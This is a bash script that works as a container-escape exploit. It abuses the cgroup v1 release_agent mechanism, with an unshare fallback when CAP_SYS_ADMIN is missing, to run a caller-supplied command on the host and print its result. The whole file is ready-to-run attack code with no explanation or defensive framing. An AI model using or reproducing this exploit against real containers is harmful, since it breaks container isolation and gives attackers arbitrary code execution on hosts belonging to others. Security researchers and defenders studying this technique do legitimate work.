#!/bin/bash

hackCMD=$1
CAP_SYS_ADMIN=0x80000
ifSysAdmin=0
mountDir=/tmp/testcgroup
cmdPath=/cmd
hostPath=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

mkdir $mountDir
# create cmd
touch $cmdPath
echo '#!/bin/sh' > $cmdPath
echo "$1 > $hostPath/result"  >> $cmdPath
chmod 777 $cmdPath


#create escape.sh
cat <<EOF > ./escape.sh
#!/bin/bash

subsys=\$1
mountDir=\$2
host_path=\$3

mount -t cgroup -o \$subsys cgroup \$mountDir 
if [ ! -d \$mountDir/x ]
then
    mkdir \$mountDir/x
fi

cd \$mountDir/x
echo 1 > \$mountDir/x/notify_on_release
echo "\$host_path/cmd" > \$mountDir/release_agent

sh -c "echo \\\$\\\$ >  \$mountDir/x/cgroup.procs"
sleep 0.5
umount $mountDir 
EOF
chmod 777 ./escape.sh

#get if has cap_sys_admin
nowCap=`cat /proc/$$/status | grep CapEff`
nowCap=${nowCap#*CapEff:}
nowCap=${nowCap%%CapEff*}
nowCap=0x${nowCap: 1: 16}

ifSysAdmin=0
if [ $((($nowCap)&$CAP_SYS_ADMIN)) != 0 ]
then
    ifSysAdmin=1
fi

if [ $ifSysAdmin == 1 ]
then 
    echo "[+] You have CAP_SYS_ADMIN!"
else
    echo "[-] You donot have CAP_SYS_ADMIN, will try"
fi



#try escape
while read -r subsys
do
    if [ $ifSysAdmin == 1 ]
    then
        if mount -t cgroup -o $subsys cgroup $mountDir 2>&1 >/dev/null && test -w $mountDir/release_agent >/dev/null 2>&1 ; then
            ./escape.sh $subsys $mountDir $hostPath 
            echo "[+] Escape Success!"
            rm -r $mountDir
            cat /result
            rm  /result
            exit 0
        fi
    else
        if unshare -UrmC --propagation=unchanged bash -c "mount -t cgroup -o $subsys cgroup $mountDir 2>&1 >/dev/null && test -w $mountDir/release_agent" >/dev/null 2>&1 ; then
            unshare -UrmC --propagation=unchanged bash -c "./escape.sh $subsys $mountDir $hostPath"
            echo "[+] Escape Success with unshare!"
            rm -r $mountDir
            cat /result
            rm  /result
            exit 0
        fi
    fi
done <<< $(cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$')

echo "[-] Escape Fail!"
rm -r $mountDir

    






